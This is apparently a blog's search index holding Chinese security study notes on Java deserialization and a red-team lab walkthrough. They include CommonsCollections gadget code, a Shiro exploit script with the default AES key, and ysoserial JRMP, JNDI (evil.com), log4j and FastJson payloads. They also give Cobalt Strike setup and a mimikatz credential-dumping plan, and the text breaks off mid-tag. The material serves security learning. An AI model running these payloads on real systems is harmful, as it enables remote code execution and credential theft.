<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/10/12/java-an-quan-xue-xi/"/>
      <url>/2022/10/12/java-an-quan-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>为什么产生安全问题?</p><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><p>可能的形式</p><ol><li><p>入口类的readObject 直接调用危险函数</p></li><li><p>入口类参数中包含可控类，该类又有危险函数，readObject时调用</p></li><li><p>入口类参数中包含可控类，该类又调用其它有危险函数的类，readObject时调用</p><p>比如 类型定义为Object，调用equals、hashcode、toString</p><p>重点 相同类型 同名函数</p><p>4.构造函数/静态代码块等类加载时隐式执行</p></li></ol><p>  共同条件 继承Serializable</p><p>  入口类  source(重写readObject 调用常见函数 参数类型宽泛 最好jdk自带)</p><p>  调用链 gadget chain 相同名称 相同类型</p><p> 执行类 sink（rec ssrf写文件等等）</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>反射的作用:让java具有动态性</p><p>修改已知对象的属性</p><p>动态生成对象</p><p>动态调用方法</p><p>操作内部类和方法</p><p>在反序列化中的应用</p><p>  定制需要的对象</p><p>通过invoke 调用除了同名函数以外的函数</p><p>通过Class类创建对象，引入不能序列化的类</p><h2 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h2><p>1.类加载与反序列化</p><p>类加载的时候会执行代码</p><p>初始化：静态代码块</p><p>实例化：构造代码块，无参构造函数</p><p>2.动态类加载方法</p><pre class="line-numbers language-none"><code class="language-none">class.forName (默认初始化)ClassLoader.loadClass 不进行初始化底层的原理，实现加载任意的类ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoaderloadClass-&gt;findClass(重写)-&gt;defineClass(从字节码加载类)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">URLClassLoader(任意加载类) file/http/jarClassloader.defineClass 字节码加载任意类   私有类Spring Unsafe.defineClass   public类 但不能直接生成  Spring里面可以直接生成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><pre class="line-numbers language-none"><code class="language-none">1.hashMap-&gt;readobject()2.hashMap-&gt;hash(key) 3.key.hashCode() =&gt;URL-&gt;hashcode()4.URLStreamHandler-&gt;hashcode()5.URLStreamHandler-&gt;getHostAddress()6.InetAddress-&gt;getByName()反序列化入口类 readObject，找常用函数hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>准备工作</p><p><a href="%5B%E6%9F%A5%E6%89%BEannocationinvocationhandler%E5%8C%85%5D(https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler)">OpenJDK</a></p><p><a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">jdk各版本</a></p><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/src/share/classes/sun">8u65对应的sun包</a></p><p>maven仓库common3.2.1</p><p>链子 </p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  后半条链  <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> transformerMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span>   annotationInvocationHandler<span class="token punctuation">.</span>invoke<span class="token operator">-&gt;</span><span class="token class-name">Map</span>      <span class="token number">1.</span>InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  危险函数  找调用了<span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> 找到了<span class="token class-name">TransformedMap</span><span class="token operator">-&gt;</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 调用了valueTransformer<span class="token punctuation">.</span><span class="token function">tansform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-&gt;</span> <span class="token number">2.</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>参数可控里面传valueTransformer  找调用了checkSetvalue  <span class="token class-name">MapEntry</span><span class="token operator">-&gt;</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 调用了parent<span class="token punctuation">.</span>checkSetvalue <span class="token punctuation">(</span>parent是<span class="token class-name">MapEntry</span>的父类<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">&gt;</span> 所以遍历<span class="token class-name">Map</span>就行了  <span class="token number">3.</span>找调用了<span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>的 <span class="token operator">-&gt;</span>找到了 <span class="token class-name">AnnotationInvocationHandler</span>的readObject        所以 整条链就是      <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">TransformedMap</span><span class="token operator">-&gt;</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token class-name">MapEntry</span><span class="token operator">-&gt;</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 即遍历<span class="token class-name">Map</span>      <span class="token class-name">AnnotationInvocationHandler</span><span class="token operator">-&gt;</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>              <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment">//使memberValue.setValue(赋值为Runtime.class)</span>              <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//遍历Map</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> transformerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>lazyMap</p><pre class="line-numbers language-none"><code class="language-none">即通过 LazyMap.get()-&gt;transform我们要找什么调用了get  AnnotationInvocationHandler-&gt;invoke()查找可控的地方调用了的 方法里面有memberValues.get(member);然后 想怎么 才能走到AnnotationInvocationHandler-&gt;invoke()   即 Proxy(AnnotationInvocationHandle).xxxObjectInputStream.readObject()AnnotationInvocationHandler.readObject()Map(Proxy).entrySet()AnnotationInvocationHandler.invoke()LazyMap.get()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jdk 8u71修改了</p><pre class="line-numbers language-none"><code class="language-none">memberValue.setValue 没了    即 TransformedMap-&gt;checkSetValue()断了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>没版本限制 HashMap之类的各版本都有</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>动态类加载实现</p><p>意义在于 如果过滤了invokeTransformer 就可以换链了</p><pre class="line-numbers language-none"><code class="language-none">defineClass-&gt;newInstance()最终找到TemplatesImpl-&gt;newTransformer()  看谁调用了newTransformer() 找到TrAXFilter(不能序列化，然后又有参，所以最好在构造函数中能修改) =&gt;InstantiateTransformer   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><pre class="line-numbers language-none"><code class="language-none">ChainedTransformer.transform() 找到 TransformingComparator.compare() 找到PriorityQueue.siftDownUsingComparator()里面调用了compare()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><pre class="line-numbers language-none"><code class="language-none">TemplatesImpl.newTransformer -&gt;InvokerTransformer.transform()-&gt;ChainedTransformer.transform-&gt;TransformingComparator.compare()-&gt;PriorityQueue.siftDownUsingComparator()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/java%E5%AE%89%E5%85%A8%5Cimage-20220928094131933.png" alt="image-20220930162749028"></p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><pre class="line-numbers language-none"><code class="language-none">BadAttributeValueExpException.readObject()   TiedMapEntry.toString()      LazyMap.get<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h2><p><a href="http://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇）</a></p><p>序列化-&gt;AES加密-&gt;Base64加密</p><p>exp.py</p><pre class="line-numbers language-none"><code class="language-none">from tokenize import PlainTokenimport uuidfrom ast import Lambdaimport base64import impfrom Crypto.Cipher import AESdef get_file_data(filename):with open(filename,"rb") as f:data=f.read()return datadef aes_enc(data):BS=AES.block_sizepad=lambda s: s+((BS - len(s) % BS)*chr(BS - len(s) % BS)).encode()key="kPH+bIxk5D2deZiIxcaaaA=="mode=AES.MODE_CBCiv=uuid.uuid4().bytesencryptor=AES.new(base64.b64decode(key),mode,iv)ciphertext=base64.b64encode(iv + encryptor.encrypt(pad(data)))return ciphertextdef aes_dec(enc_data):enc_data=base64.b64decode(enc_data)unpad=lambda s :s[:-s[-1]]key="kPH+bIxk5D2deZiIxcaaaA=="mode=AES.MODE_CBCiv=enc_data[:16]encryptor=AES.new(base64.b64decode(key),mode,iv)plaintext=encryptor.decrypt(enc_data[16:])#plaintext=bytes.decode(plaintext)plaintext=unpad(plaintext)return  plaintextif __name__=="__main__":data=get_file_data("ser.bin")print(aes_enc(data))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>寻找管理Cookie的类-&gt;CookieRememberMeManager</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">getRememberedSerializedIdentity  <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token class-name">AbstractRememberMeManager</span><span class="token punctuation">.</span><span class="token function">getRememberedPrincipals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 然后发现得到之后进行了## 解密  反序列化<span class="token keyword">protected</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bytes <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><h3 id="Server-攻击-Registry"><a href="#Server-攻击-Registry" class="headerlink" title="Server 攻击 Registry"></a>Server 攻击 Registry</h3><p>Server 端在执行 bind 或者 rebind 方法的时候会将对象以序列化的形式传输给 Registry，导致 Registry 反序列化被 RCE。</p><h3 id="Client-攻击-Registry"><a href="#Client-攻击-Registry" class="headerlink" title="Client 攻击 Registry"></a>Client 攻击 Registry</h3><p>Registry 端在接收请求的时候会将数据进行反序列化处理：</p><p><img src="/java%E5%AE%89%E5%85%A8%5Ct016ec3aa07726280a5.png" alt="img"></p><p>备注（方法和 case 的对应关系）：</p><p><img src="/java%E5%AE%89%E5%85%A8%5Ct0151d5bacfc5d8cc90.png" alt="img"></p><p>所以如果控制 lookup 方法的参数是一个恶意对象的话，那么就可以攻击 Registry 达到 RCE 的效果。</p><p>主要问题在于 lookup 方法接收一个 String 类型的参数，无法直接利用，需要手动模拟 RegistryImpl_Stub#lookup 方法传递过程：</p><h4 id="Client-攻击-Server"><a href="#Client-攻击-Server" class="headerlink" title="Client 攻击 Server"></a>Client 攻击 Server</h4><h4 id="Client-发送请求"><a href="#Client-发送请求" class="headerlink" title="Client 发送请求"></a>Client 发送请求</h4><p>Client 端执行完 lookup 方法获取到远程对象，这个对象实际上是一个获取到的远程对象实际上是一个代理对象，请求会被派发到 RemoteObjectInvocationHandler#invoke 方法里面去：</p><p><img src="https://p3.ssl.qhimg.com/t01b82dd0e319e8890c.png" alt="img"></p><p>前面多个 if 都不满足，直接来到 RemoteObjectInvocationHandler#invokeRemoteMethod：</p><p><img src="https://p3.ssl.qhimg.com/t016d9e4ffe5cc1ff16.png" alt="img"></p><p>这里的 ref 是 UnicastRef 对象，来到 UnicastRef#invoke，这里代码比较长，重点地方已经标注：</p><p><img src="https://p1.ssl.qhimg.com/t01f6ef41150250dfce.png" alt="img"></p><p>而这个远程对象在执行方法的时候，方法参数类型和参数都是以序列化形式传输到 Server（var2 就是方法，var3 就是参数）：</p><p><img src="https://p5.ssl.qhimg.com/t0129d6f75e4ae70f4a.png" alt="img"></p><p><img src="https://p2.ssl.qhimg.com/t013ef147ea004f0d4f.png" alt="img"></p><h4 id="Server-端处理"><a href="#Server-端处理" class="headerlink" title="Server 端处理"></a>Server 端处理</h4><p>Server 端处理 Client 请求的方法在 UnicastServerRef#dispatch，对参数进行反序列化之后通过反射进行调用（var8 就是 Method，var10 是经过反序列化之后的参数，var1 是绑定的 Remote 对象）：</p><p><img src="https://p1.ssl.qhimg.com/t017d60353c9c7ca580.png" alt="img"></p><p>与客户端的 marshalValue 方法对应，服务端也有一个 unmarshalValue 方法用来对参数进行反序列化：</p><p><img src="https://p2.ssl.qhimg.com/t01f9c0a462fdb27aef.png" alt="img"></p><p>此外，具体执行哪一个方法是根据 hash 值来识别的：</p><p><img src="https://p0.ssl.qhimg.com/t01842be89d4a79ea84.png" alt="img"></p><h3 id="Server-攻击-Client"><a href="#Server-攻击-Client" class="headerlink" title="Server 攻击 Client"></a>Server 攻击 Client</h3><p>Server 端方法的执行结果也是以序列化的形式传输到 Client 的，还是在 UnicastServerRef#dispatch 方法中：</p><p><img src="/java%E5%AE%89%E5%85%A8%5Ct013c705bbccf0bede7.png" alt="img"></p><p>而在 Client 端同样会对方法的执行结果进行反序列化处理，UnicastRef#invoke</p><p><img src="/java%E5%AE%89%E5%85%A8%5Ct0112855844ba961804.png" alt="img"></p><p>所以服务端如果可以控制返回的数据为恶意序列化数据，那么客户端就会被 RCE</p><h3 id="Registry-攻击-Client-amp-Server"><a href="#Registry-攻击-Client-amp-Server" class="headerlink" title="Registry 攻击 Client&amp;Server"></a>Registry 攻击 Client&amp;Server</h3><p>更准确的表达是：JRMP 服务端攻击 JRMP 客户端。</p><p>使用 ysoserial 开启一个 JRMP 监听服务（这里指的是 exploit/JRMPListener）：</p><p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 ‘calc’</p><p>只要服务端或者客户端获取到 Registry，并且执行了以下方法之一，自身就会被 RCE：</p><p>list / unbind / lookup / rebind / bind</p><p><img src="/java%E5%AE%89%E5%85%A8%5Ct01a939c7ef3231d00c.png" alt="img"></p><p><img src="/java%E5%AE%89%E5%85%A8%5Ct01fa098d1f15276109.png" alt="img"></p><p>RMI 通信过程中使用的是 JRMP 协议，ysoserial 中的 exploit/JRMPListener 会在指定端口开启一个 JRMP Server，然后会向任何连接其的客户端发送反序列化 payload。</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">JNDI注入</a></p><h3 id="JNDI-是什么？"><a href="#JNDI-是什么？" class="headerlink" title="JNDI 是什么？"></a>JNDI 是什么？</h3><p>NDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。如下图：</p><p><img src="/java%E5%AE%89%E5%85%A8%5C1.png" alt="img"></p><h3 id="利用-JNDI-注入加载远程代码并执行"><a href="#利用-JNDI-注入加载远程代码并执行" class="headerlink" title="利用 JNDI 注入加载远程代码并执行"></a>利用 JNDI 注入加载远程代码并执行</h3><p><img src="/java%E5%AE%89%E5%85%A8%5C2.png" alt="img"></p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code> 想绑定的 ReferenceWrapper 对象（<code>Reference("EvilObject", "EvilObject", "http://evil-cb.com/")</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol><p>整个攻击的实现过程如上面所述，<strong>关键的利用点在于攻击者可控的允、许动态环境转换的接口函数</strong>。</p><p>注： ldap 也可以</p><h2 id="探索高版本-JDK-下-JNDI-漏洞的利用方法"><a href="#探索高版本-JDK-下-JNDI-漏洞的利用方法" class="headerlink" title="探索高版本 JDK 下 JNDI 漏洞的利用方法"></a>探索高版本 JDK 下 JNDI 漏洞的利用方法</h2><p><a href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a></p><p><a href="https://tttang.com/archive/1489/#toc_0x04">探索高版本 JDK 下 JNDI 漏洞的利用方法二</a></p><h4 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h4><p>主要就是利用jndi注入</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a> 工具</p><p>1.准备log4j环境</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--log4j2核心包--&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;                &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;                &lt;version&gt;2.14.1&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;                &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;                &lt;version&gt;2.14.1&lt;/version&gt;            &lt;/dependency&gt;            &lt;!--使用yml配置log4j2--&gt;            &lt;dependency&gt;                &lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;                &lt;artifactId&gt;jackson-dataformat-yaml&lt;/artifactId&gt;                &lt;version&gt;2.12.3&lt;/version&gt;            &lt;/dependency&gt;            &lt;!-- slf4j核心包--&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.slf4j&lt;/groupId&gt;                &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;                &lt;version&gt;1.7.32&lt;/version&gt;            &lt;/dependency&gt;            &lt;!--用于与slf4j保持桥接--&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;                &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;                &lt;version&gt;2.9.1&lt;/version&gt;            &lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.首先用工具起一个服务  rmi 服务 或者ldap服务</p><p><img src="/java%E5%AE%89%E5%85%A8%5Cimage-20221008190915569.png" alt="image-20221008190915569"></p><p>3.模拟受害机</p><pre class="line-numbers language-none"><code class="language-none">package org.vulhub;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;/** * 模拟运行存在漏洞log4j2的服务器 */public class ServerTest {    public static void main(String[] args) {        Logger logger = LogManager.getLogger();//        有些高版本jdk需要打开此行代码//       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");        //模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1        String username = "${jndi:ldap://127.0.0.1:1389/f460cl}";//        String username  = "${java:os}";        //正常打印业务日志        logger.error("username,{}",username);    }} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><pre class="line-numbers language-none"><code class="language-none">String s="{'@type':\"org.example.Test\",'cmd':'calc'}";         JSONObject jsonObject = JSON.parseObject(s);        System.out.println(jsonObject);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">package org.example;public class Test {    public void  setCmd(String cmd)throws  Exception{       Runtime.getRuntime().exec(cmd);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原理： fastjson 会解析 传入json类的set方法，从而执行攻击者构造的恶意代码</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场</title>
      <link href="/2022/07/09/hong-ri-ba-chang/"/>
      <url>/2022/07/09/hong-ri-ba-chang/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="红日靶场-1"><a href="#红日靶场-1" class="headerlink" title="红日靶场 1"></a>红日靶场 1</h2><h3 id="cs渗透神器"><a href="#cs渗透神器" class="headerlink" title="cs渗透神器"></a>cs渗透神器</h3><p><a href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">狼组安全团队知识库 </a></p><p><a href="https://www.bilibili.com/video/BV1wf4y1a7FF/?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=7c9fecd0cf10bfcafa92a1ac0dbeb51a">红日靶场1视频-白日梦组长 </a></p><p>数据交互形式为   靶机=&gt;团队服务器=&gt;客户端 </p><p>1.团队服务器 (只能运行在linux环境中) </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">./teamserver your_ip your_passowrd [config_file]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704144734528.png" alt="image-20220704144734528"></p><p>2.连接到服务器</p><pre class="line-numbers language-none"><code class="language-none">java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/09/hong-ri-ba-chang/image-20220704171524915.png" alt="image-20220704171524915"></p><p>牢记自己的目标。域渗透：通过域成员主机作为跳板，利用域管理员可以登录域中任何成员主机的特性，定位出管理员登录过的主机，设法从成员主机内存中dump出域管理员密码(mimikatz).进而拿下DC，渗透进整个内网。</p><p>关闭防火墙</p><pre 